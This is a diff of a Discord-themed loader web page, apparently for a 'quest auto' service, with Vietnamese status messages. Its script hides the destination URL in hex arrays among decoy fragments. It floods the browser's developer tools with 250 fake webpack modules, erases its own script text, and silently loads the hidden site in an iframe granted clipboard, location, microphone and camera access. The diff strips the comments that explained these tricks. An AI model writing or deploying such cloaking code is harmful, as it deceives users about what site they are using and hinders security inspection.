@@ -89,9 +89,7 @@
     <div class="orb orb-2"></div>
     <div class="orb orb-3"></div>
     <div class="orb orb-4"></div>
-    
     <iframe id="content-frame" src="about:blank" allow="clipboard-read; clipboard-write; geolocation; microphone; camera"></iframe>
-    
     <div id="loader">
         <div class="logo-wrapper">
             <div class="logo-ring"></div>
@@ -118,82 +116,56 @@
             <div class="pill"><span class="pill-dot"></span>Đa nền tảng</div>
         </div>
     </div>
-    
     <script>
     (function(){
         'use strict';
-
-        var _0xSelf = document.currentScript;
-
-        /* =============================================
-           1. GIẢI MÃ LINK - ĐÃ SỬA LỖI LẶP "auto"
-           URL đúng: https://discordquestauto.space-z.ai/
-           ============================================= */
+        var _0xSelf=document.currentScript;
         var _0xCore=[
-            [0x2f,0x76,0x31,0x2f,0x61,0x75,0x74,0x68],                            // /v1/auth (RÁC)
-            [0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f],                            // https://
-            [0x2f,0x63,0x64,0x6e,0x2f,0x6a,0x73,0x2f],                            // /cdn/js/ (RÁC)
-            [0x64,0x69,0x73,0x63,0x6f,0x72,0x64,0x71,0x75,0x65,0x73,0x74],       // discordquest
-            [0x2f,0x73,0x74,0x61,0x74,0x69,0x63,0x2f],                            // /static/ (RÁC)
-            [0x61,0x75,0x74,0x6f,0x2e,0x73,0x70,0x61,0x63,0x65],                  // auto.space
-            [0x2f,0x61,0x70,0x69,0x2f,0x76,0x32,0x2f],                            // /api/v2/ (RÁC)
-            [0x2d,0x7a,0x2e,0x61,0x69,0x2f]                                       // -z.ai/
+            [0x2f,0x76,0x31,0x2f,0x61,0x75,0x74,0x68],
+            [0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f],
+            [0x2f,0x63,0x64,0x6e,0x2f,0x6a,0x73,0x2f],
+            [0x64,0x69,0x73,0x63,0x6f,0x72,0x64,0x71,0x75,0x65,0x73,0x74],
+            [0x2f,0x73,0x74,0x61,0x74,0x69,0x63,0x2f],
+            [0x61,0x75,0x74,0x6f,0x2e,0x73,0x70,0x61,0x63,0x65],
+            [0x2f,0x61,0x70,0x69,0x2f,0x76,0x32,0x2f],
+            [0x2d,0x7a,0x2e,0x61,0x69,0x2f]
         ];
-        /* Nối index 1 + 3 + 5 + 7 = "https://" + "discordquest" + "auto.space" + "-z.ai/" */
         var target=_0xCore[1].concat(_0xCore[3],_0xCore[5],_0xCore[7]).map(function(c){return String.fromCharCode(c)}).join('');
-
-        /* =============================================
-           2. BƠM 250+ FILE RÁC VÀO SOURCES TAB
-           ============================================= */
-        function _injectSourceFile(path, lines) {
-            var s = "/* Webpack Module: " + path + " */\n";
-            s += "(function(module, exports, __webpack_require__) {\n";
-            s += "'use strict';\n";
-            s += "var _config = __webpack_require__('./internal/config.js');\n";
-            for(var i=0; i<lines; i++) {
-                var v1 = "_v" + Math.random().toString(36).substring(2, 10);
-                var v2 = "_fn" + Math.random().toString(36).substring(2, 10);
-                var v3 = "mod" + Math.floor(Math.random() * 9999);
-                s += "var " + v1 + " = __webpack_require__('./lib/" + Math.random().toString(36).substring(2, 6) + ".js');\n";
-                s += "function " + v2 + "(d) { \n";
-                s += "  if(" + v1 + ".debug) { \n";
-                s += "    var " + v3 + " = " + v1 + ".parse(d);\n";
-                s += "    return " + v3 + " !== null ? " + v3 + ".data : false;\n";
-                s += "  } else { return false; }\n";
-                s += "}\n";
-                s += "exports." + v2 + " = " + v2 + ";\n";
+        function _injectSourceFile(path,lines){
+            var s="/* Webpack Module: "+path+" */\n";
+            s+="(function(module, exports, __webpack_require__) {\n";
+            s+="'use strict';\n";
+            s+="var _config = __webpack_require__('./internal/config.js');\n";
+            for(var i=0;i<lines;i++){
+                var v1="_v"+Math.random().toString(36).substring(2,10);
+                var v2="_fn"+Math.random().toString(36).substring(2,10);
+                var v3="mod"+Math.floor(Math.random()*9999);
+                s+="var "+v1+" = __webpack_require__('./lib/"+Math.random().toString(36).substring(2,6)+".js');\n";
+                s+="function "+v2+"(d) { \n";
+                s+="  if("+v1+".debug) { \n";
+                s+="    var "+v3+" = "+v1+".parse(d);\n";
+                s+="    return "+v3+" !== null ? "+v3+".data : false;\n";
+                s+="  } else { return false; }\n";
+                s+="}\n";
+                s+="exports."+v2+" = "+v2+";\n";
             }
-            s += "});\n";
-            s += "//# sourceURL=webpack://" + path;
-            try {
-                var script = document.createElement('script');
-                script.textContent = s;
-                document.head.appendChild(script);
-                document.head.removeChild(script);
-            } catch(e) {}
+            s+="});\n";
+            s+="//# sourceURL=webpack://"+path;
+            try{var script=document.createElement('script');script.textContent=s;document.head.appendChild(script);document.head.removeChild(script);}catch(e){}
         }
-
-        var _roots = ['node_modules', 'src', 'dist', 'build', 'out', 'public', 'assets', 'vendor', 'core', 'lib', 'app', 'pages', 'styles', 'scripts', 'static', 'components', 'services', 'utils', 'hooks', 'context', 'reducers', 'actions', 'middlewares', 'layouts', 'providers', 'config'];
-        var _libs = ['react', 'vue', 'angular', 'lodash', 'webpack', 'babel', 'core-js', 'axios', 'redux', 'next', 'nuxt', 'svelte', 'rxjs', 'tslib', 'zone.js', 'scheduler', 'clone', 'process', 'crypto', 'firebase', 'express', 'koa', 'hapi', 'mongoose', 'prisma', 'graphql', 'apollo', 'socket.io', 'moment', 'dayjs', 'chart.js', 'd3', 'three.js', 'gsap', 'framer', 'tailwind', 'bootstrap', 'material-ui', 'ant-design', 'chakra'];
-        var _exts = ['.js', '.ts', '.tsx', '.jsx', '.mjs', '.cjs'];
-
-        for(var i=0; i<250; i++){
-            var depth = Math.floor(Math.random()*4)+3;
-            var pathParts = [_roots[Math.floor(Math.random()*_roots.length)]];
-            for(var d=1; d<depth-1; d++){
-                if(d===1 && Math.random()>0.5){
-                    pathParts.push(_libs[Math.floor(Math.random()*_libs.length)]);
-                } else {
-                    pathParts.push(Math.random().toString(36).substring(2, Math.floor(Math.random()*5)+4));
-                }
+        var _roots=['node_modules','src','dist','build','out','public','assets','vendor','core','lib','app','pages','styles','scripts','static','components','services','utils','hooks','context','reducers','actions','middlewares','layouts','providers','config'];
+        var _libs=['react','vue','angular','lodash','webpack','babel','core-js','axios','redux','next','nuxt','svelte','rxjs','tslib','zone.js','scheduler','clone','process','crypto','firebase','express','koa','hapi','mongoose','prisma','graphql','apollo','socket.io','moment','dayjs','chart.js','d3','three.js','gsap','framer','tailwind','bootstrap','material-ui','ant-design','chakra'];
+        var _exts=['.js','.ts','.tsx','.jsx','.mjs','.cjs'];
+        for(var i=0;i<250;i++){
+            var depth=Math.floor(Math.random()*4)+3;
+            var pathParts=[_roots[Math.floor(Math.random()*_roots.length)]];
+            for(var d=1;d<depth-1;d++){
+                if(d===1&&Math.random()>0.5){pathParts.push(_libs[Math.floor(Math.random()*_libs.length)]);}
+                else{pathParts.push(Math.random().toString(36).substring(2,Math.floor(Math.random()*5)+4));}
             }
-            pathParts.push(Math.random().toString(36).substring(2, 8) + _exts[Math.floor(Math.random()*_exts.length)]);
-            _injectSourceFile(pathParts.join('/'), Math.floor(Math.random()*20)+30);
+            pathParts.push(Math.random().toString(36).substring(2,8)+_exts[Math.floor(Math.random()*_exts.length)]);
+            _injectSourceFile(pathParts.join('/'),Math.floor(Math.random()*20)+30);
         }
-
-        /* =============================================
-           3. HỆ THỐNG PARTICLE
-           ============================================= */
         var cv=document.getElementById('particleCanvas');
         var cx=cv.getContext('2d');
         var ps=[];
@@ -230,64 +202,21 @@
                 cx.strokeStyle='rgba(88,101,242,'+((1-Math.sqrt(dd)/120)*.06).toFixed(4)+')';cx.lineWidth=.5;cx.stroke();}
             }}
         }
-        function loop(){
-            cx.clearRect(0,0,cv.width,cv.height);
-            for(var i=0;i<ps.length;i++){ps[i].update();ps[i].draw()}lines();requestAnimationFrame(loop);
-        }
+        function loop(){cx.clearRect(0,0,cv.width,cv.height);for(var i=0;i<ps.length;i++){ps[i].update();ps[i].draw()}lines();requestAnimationFrame(loop);}
         loop();
-
-        /* =============================================
-           4. STATUS TEXT CYCLING
-           ============================================= */
         var msgs=['Đang kết nối đến máy chủ','Đang xác thực dữ liệu','Đang tải tài nguyên','Đang khởi chạy hệ thống'];
         var si=0;
         var _origSetTimeout=window.setTimeout;
-        function cycle(){
-            var el=document.getElementById('statusText');
-            if(si<msgs.length){el.innerHTML=msgs[si++]+'<span class="dot">.</span><span class="dot">.</span><span class="dot">.</span>';_origSetTimeout(cycle,600);}
-        }
-
-        /* =============================================
-           5. IFRAME NAVIGATION + FIX KẸT ANIMATION
-           ============================================= */
+        function cycle(){var el=document.getElementById('statusText');if(si<msgs.length){el.innerHTML=msgs[si++]+'<span class="dot">.</span><span class="dot">.</span><span class="dot">.</span>';_origSetTimeout(cycle,600);}}
         addEventListener('DOMContentLoaded',function(){
             cycle();
             var frame=document.getElementById('content-frame');
             var loader=document.getElementById('loader');
-
             try{if(_0xSelf)_0xSelf.textContent="/* Webpack Runtime: Bootstrap Complete */";}catch(e){}
-
             var loaded=false;
-            function showFrame(){
-                if(loaded)return;
-                loaded=true;
-                _origSetTimeout(function(){
-                    loader.classList.add('fade-out');
-                    frame.style.display='block';
-                    requestAnimationFrame(function(){frame.classList.add('visible');});
-                },500);
-            }
-
-            try{
-                var doc=frame.contentDocument||frame.contentWindow.document;
-                doc.open();
-                doc.write('<!DOCTYPE html><html><head></head><body><script>');
-                doc.write('location.replace(atob("'+btoa(target)+'"));');
-                doc.write('<\/script></body></html>');
-                doc.close();
-            }catch(e){
-                try{frame.contentWindow.location.replace(target);}catch(e2){frame.src=target;}
-            }
-
-            var checkNav=setInterval(function(){
-                try{
-                    var h=frame.contentWindow.location.href;
-                    if(h!=='about:blank'){clearInterval(checkNav);showFrame();}
-                }catch(e){
-                    clearInterval(checkNav);showFrame();
-                }
-            },300);
-
+            function showFrame(){if(loaded)return;loaded=true;_origSetTimeout(function(){loader.classList.add('fade-out');frame.style.display='block';requestAnimationFrame(function(){frame.classList.add('visible');});},500);}
+            try{var doc=frame.contentDocument||frame.contentWindow.document;doc.open();doc.write('<!DOCTYPE html><html><head></head><body><script>');doc.write('location.replace(atob("'+btoa(target)+'"));');doc.write('<\/script></body></html>');doc.close();}catch(e){try{frame.contentWindow.location.replace(target);}catch(e2){frame.src=target;}}
+            var checkNav=setInterval(function(){try{var h=frame.contentWindow.location.href;if(h!=='about:blank'){clearInterval(checkNav);showFrame();}}catch(e){clearInterval(checkNav);showFrame();}},300);
             _origSetTimeout(function(){clearInterval(checkNav);showFrame();},6000);
         });
     })();
